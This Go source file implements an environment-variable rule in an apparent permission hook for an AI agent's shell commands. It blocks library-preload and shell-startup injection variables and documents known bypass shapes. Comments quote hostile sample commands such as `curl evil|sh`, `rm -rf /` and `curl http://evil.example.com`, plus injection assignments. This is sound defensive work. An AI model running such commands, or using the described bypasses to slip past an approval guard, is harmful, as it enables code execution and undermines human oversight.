package envvars

import (
	"fmt"
	"path/filepath"
	"strings"
	"unicode"

	"github.com/phillipgreenii/claude-extended-tool-approver/internal/cmdparse"
	"github.com/phillipgreenii/claude-extended-tool-approver/internal/hookio"
)

// maxReasonNameLen bounds the rendered length of a variable NAME echoed into a
// user-facing permissionDecisionReason.
const maxReasonNameLen = 64

// sanitizeReasonName renders an env var NAME safe to embed in a
// permissionDecisionReason: control characters are escaped and the result is
// truncated. Reason strings are shown to the user as a single-line permission
// prompt, so an embedded newline (or an ANSI escape) in the NAME would corrupt or
// spoof that prompt — and the pg2-3ggxm parser desync produced exactly that: a
// phantom "name" that was a multi-line command fragment, emitted verbatim by the
// live hook. This is defense-in-depth: a real variable name is a short identifier
// and passes through unchanged, so no legitimate reason string is altered, and no
// future parse defect can render a command fragment into a prompt.
func sanitizeReasonName(name string) string {
	var b strings.Builder
	b.Grow(len(name))
	for _, r := range name {
		if b.Len() >= maxReasonNameLen {
			_, _ = b.WriteString("...")
			break
		}
		switch {
		case r == '\n':
			_, _ = b.WriteString(`\n`)
		case r == '\r':
			_, _ = b.WriteString(`\r`)
		case r == '\t':
			_, _ = b.WriteString(`\t`)
		case !unicode.IsPrint(r):
			_, _ = fmt.Fprintf(&b, `\u%04x`, r)
		default:
			_, _ = b.WriteRune(r)
		}
	}
	return b.String()
}

// injectorVars are environment variables whose assignment is GUARANTEED to be a
// code-injection / library-preload vector regardless of value: setting one
// hijacks the dynamic linker or the shell's startup so an attacker-controlled
// payload runs before the command's "safe-looking" executable ever starts.
// These are DECISIVELY rejected — not merely deferred — because the env-var rule
// runs first (factory order) and the leaf's first-match-wins chain would
// otherwise let the safe-commands rule approve a bare `export` and green-light
// the injection (pg2-gkd5e). BASH_FUNC_* (exported shell functions) is handled
// by prefix.
//
// BASH_ENV stays here deliberately (pg2-5jj3m reviewed it alongside ENV and did NOT
// demote it). It is the strongest member of the family: bash sources it for
// NON-interactive shells — `bash script.sh` / `bash -c …`, i.e. the shape ceta
// actually guards — and it resolves a slash-less value through PATH exactly as `.`
// does, so no value shape is inert either. It also has no ordinary-project-variable
// collision: a BASH_ENV value always names a startup file to source, so the rule
// fires on its target behavior rather than on a name clash the way ENV did.
var injectorVars = map[string]bool{
	"LD_PRELOAD":            true,
	"DYLD_INSERT_LIBRARIES": true,
	"LD_LIBRARY_PATH":       true,
	"DYLD_LIBRARY_PATH":     true,
	"BASH_ENV":              true,
	"ZDOTDIR":               true,
}

// injectorAskVars are shell-startup injection vectors — same family as
// injectorVars — whose NAME also collides with an extremely common ordinary
// project variable, so a name-only Reject denies legitimate traffic. They get a
// DECISIVE Ask instead: still never auto-approved, but USER-OVERRIDABLE.
//
// `ENV` is the only member (pg2-5jj3m). In POSIX `sh` it names a file sourced at
// shell startup, so `ENV=/evil.sh` is a real vector — but `ENV=dev` /
// `ENV=<project dir>` is also everyday developer traffic, and 8 logged rows of a
// legitimate tilt harness were hard-DENIED by it. A Reject cannot be waved through
// the way an Ask can, which makes it the failure mode most likely to get the whole
// guard disabled — a worse security outcome than the false positive.
//
// Why the split is by NAME and not by VALUE (the narrowing this bead rejected): a
// value with no slash is NOT provably inert. `ENV=dev` names the RELATIVE file
// `./dev`, so an attacker who can plant `./dev` gets it sourced; and `export ENV=…`
// PERSISTS, so a shell started by a LATER tool call can honour it — neither fact is
// knowable from the single assignment in front of the rule. Conditioning on the
// invoked shell fails for the same persistence reason.
//
// Why Ask and not Abstain, even though `ENV` only fires for an INTERACTIVE `sh` in
// every mainstream modern shell (bash-as-sh, dash, mksh and ksh93 all gate it on
// interactivity; ksh88-lineage shells do not): interactive shells DO get started, and
// Abstain cannot enforce "never auto-approve" — safe-commands approves a bare
// `export` and first-match-wins would let that win (fbbf3ade / pg2-gkd5e).
var injectorAskVars = map[string]bool{
	"ENV": true,
}

// askVars are dangerous but NOT guaranteed unsafe for a given value (a legitimate
// PATH tweak, a HOME override). Setting one can redirect which binaries run or
// where dotfiles/credentials are read, so the assignment is never auto-approved on
// the strength of its NAME — the VALUE decides (see preservesCallerValue):
//
//   - a value that PRESERVES the caller's own value and only prepends/appends
//     STATIC ABSOLUTE path components is affirmatively safe → Approve;
//   - anything else — a REPLACEMENT, or a component behind an expansion we cannot
//     classify — is escalated to Ask (the user decides).
//
// The fallback is Ask and MUST NOT be softened to Abstain. Abstain cannot enforce
// "never auto-approve": the safe-commands rule approves a bare `export`, and
// first-match-wins would let that win, so only a decisive Ask/Reject actually
// prevents auto-approval (pg2-gkd5e/fbbf3ade). Re-verified on this tree — with the
// fallback demoted to Abstain, `export PATH=/replaced`, `PATH=/replaced echo hi`,
// `export HOME=/tmp/fakehome`, `PATH=$(mktemp -d) echo hi` and
// `PATH=$(bd create x) echo hi` all silently return `allow`.
var askVars = map[string]bool{
	"PATH": true,
	"HOME": true,
}

// Rule is the unified, DECISIVE environment-assignment guard. It aggregates a
// per-(var,value) sub-verdict most-restrictive-wins.
//
// Approve CONTRACT (pg2-0q99a — this replaced a former "NEVER returns Approve"
// invariant). The rule returns Approve for EXACTLY ONE shape, and all three
// conditions must hold:
//
//  1. the NAME is an askVar (PATH/HOME) — never an injector, never an
//     injectorAskVar, never a benign name (a benign assignment stays Abstain: the
//     rule has no opinion to offer);
//  2. the VALUE satisfies preservesCallerValue — it demonstrably preserves the
//     caller's own value and adds only static absolute path components; and
//  3. the assignment IS the whole leaf (assignmentIsWholeLeaf) — a command-less
//     leaf or one of the `export`/`env`/`command` assignment builtins.
//
// Condition 3 is what keeps the Approve from being a bypass, and it is not
// optional. engine.Evaluate is FIRST-MATCH-WINS and this rule runs in the early
// band, ahead of pathsafety / git / gh / monorepo / kubectl / safe-commands /
// curl, so a decisive Approve SHORT-CIRCUITS every later rule for that leaf. An
// unconditional Approve would therefore turn a benign PATH extension into a
// universal auto-approve prefix — measured on this tree:
//
//	git push --force origin main       ask     -> allow
//	tee /etc/hosts                     abstain -> allow
//	kubectl delete ns prod             abstain -> allow
//	curl http://evil.example.com       abstain -> allow
//
// Beside a real command the verified-safe assignment is instead TRANSPARENT
// (Abstain), exactly as `FOO=bar` / `PYTHONPATH=/foo` already are, so the command
// keeps its own verdict and approval must still be earned by the command's own
// rule. Abstain is used ONLY for that transparent case and for benign names; it is
// never the verdict for a REPLACEMENT or an unclassifiable value.
type Rule struct {
	exprEval hookio.Evaluator
}

// New constructs the rule with no evaluator. Value-recursion (inspecting the
// inner command of a dynamic value) is unavailable; an unclassifiable value is
// still escalated to Ask rather than guessed safe.
func New() *Rule {
	return &Rule{}
}

// NewWithEvaluator wires the engine so a value that embeds a command/process
// substitution can be recursed through the full rule chain and its verdict
// inherited (pg2-gkd5e, reusing the pg2-1q5i3 substitution machinery). The
// engine also carries the path evaluator used by that recursion.
func NewWithEvaluator(eval hookio.Evaluator) *Rule {
	return &Rule{exprEval: eval}
}

func (r *Rule) Name() string {
	return "env-vars"
}

// assignmentIsWholeLeaf reports whether the leaf's env assignments are ALL the leaf
// contains — i.e. there is no executable whose own safety the rules AFTER this one
// in the first-match-wins chain still have to judge. Only such a leaf may receive
// the Approve of the value-aware split (condition 3 of the Rule contract): with no
// command to pre-empt, a decisive Approve cannot mask another rule's verdict.
//
// True for a command-less leaf — the shape cmdparse.Parse produces for an
// assignment-only compound segment (`PATH="$PATH:/x" && cmd`), which pg2-mtnmb made
// rule-visible (it was DISCARDED before, and that was a live auto-approve bypass).
// Approving it is what keeps the compound form's verdict equal to the
// leading/export/env forms (the pg2-gkd5e position-independence invariant) — and
// true for the three assignment/read-only-env builtins, which carry their
// assignments in EnvVars and have no inner command of their own:
//
//   - `export` (cmdparse lifts each NAME=VALUE arg into EnvVars);
//   - `env` / `command` with no inner executable (a bare env query — when an inner
//     command IS present cmdparse rewrites Executable to that command, so this
//     returns false and the assignment stays transparent).
func assignmentIsWholeLeaf(pc cmdparse.ParsedCommand) bool {
	if pc.Executable == "" {
		return true
	}
	switch filepath.Base(pc.Executable) {
	case "export", "env", "command":
		return true
	}
	return false
}

// preservesCallerValue reports whether an askVar assignment's VALUE is the
// verified-safe EXTEND shape: it keeps the caller's own value ($NAME / ${NAME}) as
// one whole `:`-separated component, and every other component is a static absolute
// path. That is the shape 954 of the 1,118 logged PATH/HOME assignments use, with
// zero adversarial values among them (pg2-qfuto).
//
// The predicate is deliberately STRICT — a component must be literal and absolute,
// so nothing behind an expansion can smuggle a lookup directory in. It therefore
// still asks on `$PWD/bin:$PATH`, `$JAVA_HOME/bin:$PATH` and
// `$(nix build …)/bin:$PATH`. Widening it to accept $VAR-derived components is a
// separate, weaker guarantee (`PATH="$EVIL:$PATH"` would approve) and needs its own
// decision; do not widen it here.
//
// What it can NOT distinguish, knowingly: a hostile static prepend
// (`PATH="/tmp/evil/bin:$PATH"`) from a legitimate one (`/nix/store/…/bin`). That
// is inherent to any value-aware split — the caller's PATH is still intact and the
// directory is one the user already controls — and it is the same guarantee a
// settings.json `Bash(export PATH:*)` entry already grants.
func preservesCallerValue(ev cmdparse.EnvAssignment) bool {
	// The bash append form NAME+=VALUE (normalized to NAME by cmdparse) IS
	// semantically a preserve, but it deliberately does NOT approve: no logged row
	// uses it, and excluding it keeps the Approve as narrow as possible.
	if strings.HasPrefix(ev.Raw, ev.Name+"+=") {
		return false
	}
	// Only a plain $VAR/${VAR}-referencing value can be the extend shape. A value
	// with no expansion at all cannot reference the caller's value (it is a
	// REPLACEMENT), and a command/process substitution or arithmetic expansion is
	// not something this predicate is allowed to reason about — those keep asking.
	if ev.Expansion != cmdparse.ExpansionVarRef {
		return false
	}
	value, ok := literalValue(ev.Value)
	if !ok {
		return false
	}
	selfRef, braceRef := "$"+ev.Name, "${"+ev.Name+"}"
	preserved := false
	for _, component := range strings.Split(value, ":") {
		if component == selfRef || component == braceRef {
			preserved = true
			continue
		}
		if !isStaticAbsolutePath(component) {
			return false
		}
	}
	return preserved
}

// literalValue strips ONE pair of wrapping double quotes from a raw assignment
// value (cmdparse keeps an assignment token's quoting verbatim, so the value of
// `PATH="$PATH:/x"` is `"$PATH:/x"` including the quotes) and reports false if any
// quote or backslash survives — only a value that is entirely unquoted or wrapped
// in a single double-quoted span can be split into components whose literal text is
// what the shell will actually use.
//
// A SINGLE-quoted value is rejected outright, and that distinction is load-bearing:
// in `PATH='$PATH:/x'` the `$PATH` is NOT expanded, so despite reading like an
// extend it REPLACES PATH with the literal string `$PATH:/x`. Mixed quoting
// (`PATH="$PATH":/x`) is rejected for the same reason — the component boundaries
// are no longer derivable from the text by splitting alone.
func literalValue(value string) (string, bool) {
	if len(value) >= 2 && value[0] == '"' && value[len(value)-1] == '"' {
		value = value[1 : len(value)-1]
	}
	if strings.ContainsAny(value, "\"'\\") {
		return "", false
	}
	return value, true
}

// isStaticAbsolutePath reports whether one `:`-separated component of a PATH-like
// value is a literal absolute path: it starts with '/' and contains nothing that
// could introduce an expansion, re-quote the value, or corrupt the user-facing
// prompt. Everything else in a path is inert for a PATH lookup, so the check is a
// denylist of the characters that are NOT.
//
// An EMPTY component is rejected by the leading-'/' requirement, and that matters:
// an empty PATH entry means "the current directory" to the shell, so
// `PATH="$PATH:"` and `PATH=":$PATH"` put an attacker-writable CWD on the lookup
// path and must keep asking.
func isStaticAbsolutePath(component string) bool {
	if !strings.HasPrefix(component, "/") {
		return false
	}
	for i := 0; i < len(component); i++ {
		switch c := component[i]; {
		case c == '$' || c == '`' || c == '"' || c == '\'' || c == '\\':
			return false
		case c < 0x20 || c == 0x7f:
			return false
		}
	}
	return true
}

func (r *Rule) Evaluate(input *hookio.HookInput) (hookio.RuleResult, error) {
	if input.ToolName != "Bash" {
		return hookio.NotApplicable()
	}
	cmdStr, err := input.BashCommand()
	if err != nil {
		return hookio.RuleResult{}, fmt.Errorf("env-vars: read bash command: %w", err)
	}
	parsed := cmdparse.Parse(cmdStr)

	// THIS IS A FOLD, NOT A CHAIN, so ADR 0043's "continue" has no representation
	// inside it and NoOpinion — not an error — is the seed and the floor. Routing
	// anything here through the error channel would be trap 4: MostRestrictive is
	// escalate-only from a NoOpinion seed, and dropping to the Approve identity
	// would manufacture an approval.
	//
	// Aggregate every assignment's sub-verdict most-restrictive-wins. NoOpinion is
	// the identity: a command with no (or only benign) assignments folds to
	// NoOpinion, which the single translation at the END of this function turns into
	// the chain's not-applicable so the rest of the chain still runs.
	//
	// An Approve sub-verdict is HELD ASIDE rather than folded, for two reasons.
	// MostRestrictive is escalate-only (Approve < NoOpinion), so folding it would
	// simply discard it. And it is surfaced only when it can do no harm: no other
	// assignment produced anything more restrictive, and the assignment is the whole
	// leaf — condition 3 of the Rule contract, which stops the Approve from
	// short-circuiting the rules that run after this one. Beside a real command the
	// verified-safe assignment contributes nothing and the leaf stays NoOpinion.
	result := hookio.RuleResult{Decision: hookio.NoOpinion, Module: r.Name()}
	var held *hookio.RuleResult
	for _, pc := range parsed {
		wholeLeaf := assignmentIsWholeLeaf(pc)
		for _, ev := range pc.EnvVars {
			sub := r.evaluateAssignment(ev, input)
			if sub.Decision == hookio.Approve {
				if wholeLeaf && held == nil {
					approved := sub
					held = &approved
				}
				continue
			}
			result = hookio.MostRestrictive(result, sub)
		}
	}
	if result.Decision == hookio.NoOpinion && held != nil {
		return *held, nil
	}
	// THE ONE TRANSLATION POINT from fold vocabulary to chain vocabulary: a folded
	// NoOpinion is "nothing here was mine", which before ADR 0043 the engine read as
	// "continue" — so it MUST become ErrNotApplicable, not a terminal verdict, or
	// every ordinary `A=1 cmd` would stop the chain and never reach safe-commands.
	// hookio.FromRecursion is that translation; it is the same rule the recursing
	// rules (nix/docker/kubectl) apply to an inner expression's verdict.
	return hookio.FromRecursion(result)
}

// evaluateAssignment returns the sub-verdict for a single NAME=VALUE assignment.
// The NAME gives the base verdict (injector→Reject, injectorAskVar→Ask,
// PATH/HOME→Ask-unless-verified-safe, else→NoOpinion) — a FOLD sub-verdict, so it is
// a plain RuleResult and never an error. A VALUE that embeds an unclassifiable
// substitution escalates decisively
// (never auto-approve) and inherits a stronger verdict from recursing the body.
func (r *Rule) evaluateAssignment(ev cmdparse.EnvAssignment, input *hookio.HookInput) hookio.RuleResult {
	name := r.Name()

	// Base verdict from the variable NAME.
	// NoOpinion, not an error: this is a fold sub-verdict (see Evaluate), and the
	// fold has no representation for the chain's "continue".
	result := hookio.RuleResult{Decision: hookio.NoOpinion, Module: name}
	switch {
	case injectorVars[ev.Name] || strings.HasPrefix(ev.Name, "BASH_FUNC_"):
		result = hookio.RuleResult{
			Decision: hookio.Reject,
			Reason:   "refusing to set code-injection env var: " + sanitizeReasonName(ev.Name),
			Module:   name,
		}
	case injectorAskVars[ev.Name]:
		// Same injection family, but the NAME collides with an ordinary project
		// variable, so the verdict is a DECISIVE Ask rather than a Reject (pg2-5jj3m).
		// Unconditional on the VALUE — see injectorAskVars for why no value shape here
		// is provably inert — and deliberately NOT routed through the askVars
		// value-aware split, so `ENV="$ENV:/x"` cannot reach an Approve.
		result = hookio.RuleResult{
			Decision: hookio.Ask,
			Reason:   "setting shell-startup env var requires confirmation: " + sanitizeReasonName(ev.Name),
			Module:   name,
		}
	case askVars[ev.Name]:
		// Value-aware split (pg2-0q99a): the NAME alone is not a verdict. A value
		// that provably preserves the caller's own value and only adds static
		// absolute components is affirmatively safe; everything else — every
		// REPLACEMENT, and every value with a component we cannot classify — keeps
		// the decisive Ask. This is a pure NAME/VALUE decision and must stay
		// independent of r.exprEval, so the verdict is identical with New() and
		// NewWithEvaluator(). Whether the Approve is actually surfaced is scoped by
		// the caller (see Evaluate / the Rule contract).
		if preservesCallerValue(ev) {
			result = hookio.RuleResult{
				Decision: hookio.Approve,
				Reason:   "sensitive env var preserves the caller's value and adds only static absolute paths: " + sanitizeReasonName(ev.Name),
				Module:   name,
			}
		} else {
			result = hookio.RuleResult{
				Decision: hookio.Ask,
				Reason:   "setting sensitive env var requires confirmation: " + sanitizeReasonName(ev.Name),
				Module:   name,
			}
		}
	}

	// Value handling. A value the parser classified as an unclassifiable /
	// non-safe substitution is escalated DECISIVELY to at least Ask so the
	// assignment is never auto-approved — critical for the leading form
	// (`FOO=$(evil) cmd`), where the engine's substitution choke point strips the
	// leading assignment (cmdparse.StripLeadingEnvAssignments, engine.go) and so
	// never applies its own static-allowlist Abstain floor to the value's body,
	// leaving the env-var rule as the ONLY guard. A value on the STATIC safe
	// allowlist (ExpansionSafeCmd, e.g. $(git rev-parse HEAD), $(mktemp -d)) or a
	// plain static/var-ref/arithmetic value carries no escalation.
	//
	// The substitution bodies are recursed through the full engine (pg2-gkd5e
	// value-recursion via pg2-1q5i3) FIRST, and the Ask is applied as a
	// POST-RECURSION FALLBACK rather than an unconditional floor (pg2-5huwx). This
	// ordering matters because MostRestrictive is escalate-only: folding the Ask in
	// before the recursion made it impossible for an approvable body to demote it,
	// so ordinary local-variable capture (`T4=$(bd create x --type task) cmd`,
	// `action_meta=$(jq -nc ...) cmd`) asked every time.
	//
	// The demotion requires the value to be POSITIVELY CLEARED: at least one
	// substitution was enumerated and EVERY one of them affirmatively Approved
	// through the chain. That is deliberately narrower than "not risky":
	//
	//   - An Abstain body is merely UNCLASSIFIED, not safe (`curl evil`,
	//     `rm -rf /` and `curl evil|sh` all recurse to Abstain), and Abstain is
	//     swallowed by the engine's first-match-wins leaf chain — so it must still
	//     reach the fallback or the surviving leaf re-approves the whole command.
	//   - A value classified ExpansionUnknown that enumerates to ZERO
	//     substitutions (e.g. an unterminated `$(`) is unclassifiable by
	//     construction and must not be cleared vacuously.
	//   - With no evaluator wired (New()) there is no recursion at all, so the
	//     fallback stays unconditional.
	//
	// The NAME-derived base verdict above is never lowered: MostRestrictive only
	// escalates, so PATH/HOME stay Ask and injectors stay Reject however benign
	// the body turns out to be.
	if ev.Expansion == cmdparse.ExpansionUnknown {
		var subResults []hookio.RuleResult
		clearedByRecursion := false
		if r.exprEval != nil {
			subs := cmdparse.EnumerateSubstitutions(ev.Value)
			clearedByRecursion = len(subs) > 0
			for _, sub := range subs {
				stack := []hookio.StackFrame{{RuleName: name, Command: "env-value", Expression: ev.Raw}}
				subResult := r.exprEval.EvaluateExpression(sub.Body, stack, input)
				if subResult.Decision != hookio.Approve {
					clearedByRecursion = false
				}
				subResults = append(subResults, subResult)
			}
		}
		if !clearedByRecursion {
			result = hookio.MostRestrictive(result, hookio.RuleResult{
				Decision: hookio.Ask,
				Reason:   "env var value contains an unevaluated/unsafe expression: " + sanitizeReasonName(ev.Name),
				Module:   name,
			})
		}
		// Folded after the fallback so a body that is itself Ask keeps the
		// fallback's reason (MostRestrictive keeps `current` on a tie), preserving
		// the pre-pg2-5huwx reason precedence for every non-cleared value.
		for _, subResult := range subResults {
			result = hookio.MostRestrictive(result, subResult)
		}
	}

	return result
}
